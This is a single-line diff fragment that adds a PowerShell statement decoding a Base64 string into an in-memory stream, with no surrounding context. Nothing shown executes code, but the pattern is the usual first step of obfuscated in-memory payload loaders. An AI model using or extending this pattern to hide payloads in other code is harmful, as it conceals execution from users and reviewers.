@@ -1,0 +1,1 @@
+$b=[Convert]::FromBase64String($c);$m=New-Object IO.MemoryStream(,$b)
